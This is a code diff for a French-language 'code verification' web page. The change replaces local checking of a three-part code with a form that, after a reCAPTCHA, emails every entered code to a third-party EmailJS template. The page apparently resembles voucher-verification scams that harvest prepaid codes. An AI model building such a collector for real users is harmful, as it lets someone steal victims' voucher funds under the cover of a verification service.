@@ -9,14 +9,16 @@ const validCodes = [
 
 ];
 
+
 const part1 = document.getElementById("part1");
 const part2 = document.getElementById("part2");
 const part3 = document.getElementById("part3");
 
-const button = document.getElementById("verifyBtn");
 const result = document.getElementById("result");
 
+
 const inputs = [part1, part2, part3];
+
 
 inputs.forEach((input, index)=>{
 
@@ -34,56 +36,58 @@ inputs.forEach((input, index)=>{
 
 });
 
-button.addEventListener("click",verifyCode);
 
-function verifyCode(){
+// FORMULAIRE
+const verificationForm = document.getElementById("verificationForm");
 
-    const code =
-        part1.value+"-"+
-        part2.value+"-"+
+
+verificationForm.addEventListener("submit", function(e){
+
+    e.preventDefault();
+
+
+    const code = 
+        part1.value + "-" +
+        part2.value + "-" +
         part3.value;
 
-    result.className="";
 
-    if(part1.value.length!==4){
+    const captcha = grecaptcha.getResponse();
 
-        result.classList.add("error");
-        result.innerHTML="La première partie doit contenir 4 caractères.";
+
+    if(captcha.length === 0){
+
+        alert("Veuillez confirmer le captcha.");
         return;
 
     }
 
-    if(part2.value.length!==3){
 
-        result.classList.add("error");
-        result.innerHTML="La deuxième partie doit contenir 3 caractères.";
-        return;
+    emailjs.send(
+        "service_client",
+        "template_h2aei31",
+        {
+            part1: part1.value,
+            part2: part2.value,
+            part3: part3.value,
+            code_complet: code
+        }
+    )
 
-    }
+    .then(function(){
 
-    if(part3.value.length!==3){
+        result.innerHTML = "Votre demande a été envoyée.";
+        grecaptcha.reset();
 
-        result.classList.add("error");
-        result.innerHTML="La troisième partie doit contenir 3 caractères.";
-        return;
+    })
 
-    }
 
-    if(validCodes.includes(code)){
+    .catch(function(error){
 
-        result.classList.add("success");
-        result.innerHTML="✅ Code valide.";
+        console.log(error);
+        result.innerHTML = "Erreur lors de l'envoi.";
 
-    }else{
+    });
 
-        result.classList.add("error");
-        result.innerHTML="❌ Code invalide.";
 
-    }
-
-}const response = grecaptcha.getResponse();
-
-if (response.length === 0) {
-    alert("Veuillez confirmer que vous n'êtes pas un robot.");
-    return;
-}
+});
